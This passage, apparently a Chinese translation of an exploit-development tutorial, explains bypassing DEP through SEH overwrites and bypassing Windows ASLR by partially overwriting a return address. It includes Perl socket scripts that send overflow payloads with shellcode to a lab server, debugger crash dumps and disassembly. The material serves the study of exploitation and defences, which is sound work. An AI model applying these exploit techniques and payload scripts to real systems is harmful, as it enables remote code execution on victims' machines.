### 优化后的文本

#### 建立Socket连接并发送Payload
```perl
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
my $payload = $junk . $disabledep . $nops1 . $shellcode . $nops2 . $jumpback . "\n";
print SOCKET $payload;
print "[+] Payload sent, " . length($payload) . " bytes\n";
close SOCKET or die "close: $!";
system('telnet ' . $host . ' 5555');
```
（注：这个exploit不会成功，因为它忽略了填充字节。）

#### 利用SEH绕过DEP
在前面的例子中，两个exploit都直接覆盖了返回地址。但如果覆盖SEH会怎么样呢？

在基于SEH的exploit中，通过指向 `pop/pop/ret` 指令的指针重定向执行流到 `nseh` 域中的地址上，这里放置了跳转代码（随后被执行）。当DEP启用后，仍然需要覆盖SEH结构，但不能再使用 `pop/pop/ret` 的地址，而应使用 `pop reg/pop reg/pop esp/ret` 指令的地址。指令 `pop esp` 可以改变堆栈指针，`ret` 将执行流转移到 `nseh` 中的地址上。

现在不再使用跳转指令，而是用关闭NX例程的地址覆盖 `nseh`，用指向 `pop/pop/pop esp/ret` 指令的指针覆盖异常处理器。这种指令组合很难找到，可以使用 `pvefindaddr` 工具来帮助你找到拥有这种指令的地址。

#### ASLR保护
Windows Vista、2008 Server 和 Windows 7 引入了另一种保护技术——ASLR（地址空间布局随机化），它使进程中的执行模块、DLL、栈和堆的加载地址随机化。系统从256个基地址中随机选择一个用于加载系统映像，并随机化每个线程的堆基址和栈基址。

这些地址在每次系统启动时都会变化。ASLR默认是启用的（除了IE7），非系统镜像也可以通过链接选项 `/DYNAMICBASE` 启用这种保护。也可以手动更改已编译库的 `dynamicbase` 位，使其支持ASLR技术（将PE头中的 `DllCharacteristics` 设置为 `0x40`）。

注册表项可以为映像/应用程序启用ASLR：
- 编辑 `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\` 并添加键 `MoveImages` (DWORD)
- 可用的值：
  - `0`：禁止随机化映像基地址，总是使用PE头中指定的基地址。
  - `-1`：不管是否有 `IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE` 标志，都随机化所有可重定位的映像。
  - 默认行为：仅随机化有重定位信息并且PE头中 `DllCharacteristics` 包含 `IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE` 标志的模块。

为了获得更好的效果，ASLR应该与DEP一起使用（反之亦然）。由于ASLR，即使你在Vista上使用DLL中的地址构造了exploit，该exploit也只在系统重启前有效，因为重启后，由于随机技术的应用，你的跳转地址将不再有效。

已经出现了一些绕过ASLR的技术，这里讨论两种技术：部分覆盖和使用没有启用ASLR模块中的地址。

#### 绕过ASLR：部分覆盖返回地址
这项技术在2007年3月的著名动画光标漏洞（MS Advisory 935423）利用中得到了应用。这个漏洞是由Alex Sotirov发现的。以下链接解释了这个漏洞如何被发现和攻击：
- [ANI Notes PDF](http://archive.codebreakers-journal.com/content/view/284/27/)
- [ANI Header Vulnerability](http://www.phreedom.org/research/vulnerabilities/ani-header/)
- [Metasploit Exploiting the ANI vulnerability on Vista](https://www.metasploit.com/)

这个exploit首次在Vista上绕过了ASLR保护（突破了ASLR保护机制，也绕过了/GS）。ASLR只是随机了地址的一部分。如果你重启后观察加载的模块基地址，你会注意到只有地址的高字节随机。

想象一下，当你攻击一个允许覆盖栈中返回地址的漏洞，原来的固定返回地址被系统放在栈中，如果启用了ASLR，被随机处理后的地址被放置在栈中。假设返回地址是 `0x12345678`（`0x1234` 是被随机部分，`5678` 始终不变）。如果我们可以在 `0x1234XXXX` 空间中找到有趣的代码（例如 `JMP ESP` 或其他有用的指令），我们只需要在低字节所表示的地址范围内找到这些指令并用它们的地址替换掉栈中的低字节。

让我们看一个例子：在调试器中打开 `notepad.exe`（Vista Business, SP2, English）并查看加载模块的基地址。重启并执行相同的操作，你会发现地址的两个高字节被随机化。

再次对程序执行同样的操作：
- 重启后：

如你所见，应用程序的基地址也是变化的（因为它使用VC++2008编译，并且链接选项 `/dynamicbase` 采用了默认设置）。

ImmDbg的命令 `!ASLRdynamicbase` 可以显示受ASLR保护的模块。在Vista（不开启HW DEP/NX）上不启用GS编译这个应用程序，我们知道向这个程序发送508字节的数据后，我们可以覆盖返回地址。使用调试器在 `pr()` 函数上设置断点，在覆盖返回地址之前，我们先找出类似 `0x011e1293` 的返回地址（`0x011e` 是随机的，但 `1293` 在系统重启后也是一样的）。

使用以下exploit进行攻击：
```perl
use strict;
use Socket;

my $junk = "A" x 508;
my $eipoverwrite = "BBBB";

# 初始化主机和端口
my $host = shift || 'localhost';
my $port = shift || 200;
my $proto = getprotobyname('tcp');

# 获取端口地址
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($port, $iaddr);

print "[+] Setting up socket\n";
# 创建socket并连接到端口
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
print "[+] Connecting to $host on port $port\n";
connect(SOCKET, $paddr) or die "connect: $!";
print "[+] Sending payload\n";
print SOCKET $junk . $eipoverwrite . "\n";
print "[+] Payload sent\n";
close SOCKET or die "close: $!";
```

从寄存器和堆栈的状态可以看出应该是返回地址被溢出后的状态：
```
(f90.928): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0018e23a ebx=00000000 ecx=0018e032 edx=0018e200 esi=00000001 edi=011e3388
eip=42424242 esp=0018e030 ebp=41414141 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246
42424242 ?? ???
0:000> d ecx
0018e032 18 00 00 00 00 00 41 41-41 41 41 41 41 41 41 41 ......AAAAAAAAAA
0018e042 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e052 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e062 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e072 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e082 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e092 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e0a2 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0:000> d edx
0018e200 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e210 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e220 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e230 41 41 41 41 42 42 42 42-0a 00 00 00 00 00 00 00 AAAABBBB........
0018e240 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e250 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e260 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0018e270 00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00 ................
0:000> d esp
0018e030 0a 00 18 00 00 00 00 00-41 41 41 41 41 41 41 41 ........AAAAAAAA
0018e040 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e050 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e060 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e070 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e080 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e090 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
0018e0a0 41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
```

正常情况下，当我们到了这里，我们可能会去找一个跳转到 `edx` 的指令，并且用 `jmp edx` 或 `push ebp/ret` 等指令的地址覆盖返回地址（然后用某个向后的跳转指令跳到shellcode）。但如我们所知，由于ASLR，我们不能直接覆盖返回地址了。我们现在唯一能做的就是在 `0x011exxxx`（被溢出之前的返回地址）地址范围内试着找到一个 `jmp edx` 或 `push ebp/ret` 指令，然后只要覆盖保存在栈中的返回地址的低字。在这个例子中没有这样的指令存在。

此外，即使有这样的指令存在，也会注意到覆盖返回地址的低字也不行，因为会自动添加一个字符串结束符，这样会把高字的一个字节也覆盖了...所以要想exploit成功，必须在 `0x011e00xx` 地址范围内找到类似 `jmp edx...` 的指令，这样就把我们的可选空间限制在从 `0x011e0000` 开始到 `0x011e00ff` 的这255字节的地址空间中。

以下是 `0x011E1000` 到 `0x011E10FF` 范围内的反汇编代码：
```
011E1000 /$ 55 PUSH EBP
011E1001 |. 8BEC MOV EBP,ESP
011E1003 |. 81EC 08020000 SUB ESP,208
011E1009 |. A0 1421CD00 MOV AL,BYTE PTR DS:[CD2114]
011E100E |. 8885 08FEFFFF MOV BYTE PTR SS:[EBP-1F8],AL
011E1014 |. 68 F3010000 PUSH 1F3 ; /n = 1F3 (499.)
011E1019 |. 6A 00 PUSH 0 ; |c = 00
011E101B |. 8D8D 09FEFFFF LEA ECX,DWORD PTR SS:[EBP-1F7] ; |
011E1021 |. 51 PUSH ECX ; |s
011E1022 |. E8 C30A0000 CALL  ; \memset
011E1027 |. 83C4 0C ADD ESP,0C
011E102A |. 8B55 08 MOV EDX,DWORD PTR SS:[EBP+8]
011E102D |. 8995 04FEFFFF MOV DWORD PTR SS:[EBP-1FC],EDX
011E1033 |. 8D85 08FEFFFF LEA EAX,DWORD PTR SS:[EBP-1F8]
011E1039 |. 8985 00FEFFFF MOV DWORD PTR SS:[EBP-200],EAX
011E103F |. 8B8D 00FEFFFF MOV ECX,DWORD PTR SS:[EBP-200]
011E1045 |. 898D FCFDFFFF MOV DWORD PTR SS:[EBP-204],ECX
011E104B |> 8B95 04FEFFFF /MOV EDX,DWORD PTR SS:[EBP-1FC]
011E1051 |. 8A02 |MOV AL,BYTE PTR DS:[EDX]
011E1053 |. 8885 FBFDFFFF |MOV BYTE PTR SS:[EBP-205],AL
011E1059 |. 8B8D 00FEFFFF |MOV ECX,DWORD PTR SS:[EBP-200]
011E105F |. 8A95 FBFDFFFF |MOV DL,BYTE PTR SS:[EBP-205]
011E1065 |. 8811 |MOV BYTE PTR DS:[ECX],DL
011E1067 |. 8B85 04FEFFFF |MOV EAX,DWORD PTR SS:[EBP-1FC]
011E106D |. 83C0 01 |ADD EAX,1
011E1070 |. 8985 04FEFFFF |MOV DWORD PTR SS:[EBP-1FC],EAX
011E1076 |. 8B8D 00FEFFFF |MOV ECX,DWORD PTR SS:[EBP-200]
011E107C |. 83C1 01 |ADD ECX,1
011E107F |. 898D 00FEFFFF |MOV DWORD PTR SS:[EBP-200],ECX
011E1085 |. 80BD FBFDFFFF >|CMP BYTE PTR SS:[EBP-205],0
011E108C |.^75 BD \JNZ SHORT vulnsrv.011E104B
011E108E |. 8BE5 MOV ESP,EBP
011E1090 |. 5D POP EBP
011E1091 \. C3 RETN
011E1092 CC INT3
011E1093 CC INT3
011E1094 CC INT3
011E1095 CC INT3
011E1096 CC INT3
011E1097 CC INT3
011E1098 CC INT3
011E1099 CC INT3
011E109A CC INT3
011E109B CC INT3
011E109C CC INT3
011E109D CC INT3
011E109E CC INT3
011E109F CC INT3
011E10A0 /$ 55 PUSH EBP
011E10A1 |. 8BEC MOV EBP,ESP
011E10A3 |. 8B45 08 MOV EAX,DWORD PTR SS:[EBP+8]
011E10A6 |. 50 PUSH EAX ; /
011E10A7 |. 68 1821CD00 PUSH vulnsrv.011E2118 ; |format = "Error %s"
011E10AC |. FF15 A020CD00 CALL DWORD PTR DS:[] ; \printf
011E10B2 |. 83C4 08 ADD ESP,8
011E10B5 |. E8 FA090000 CALL  ; [WSACleanup
011E10BA |. 5D POP EBP
011E10BB \. C3 RETN
```

在这个例子中，没有找到合适的 `jmp edx` 或 `push ebp/ret` 指令。因此，这种方法在这种情况下无法成功。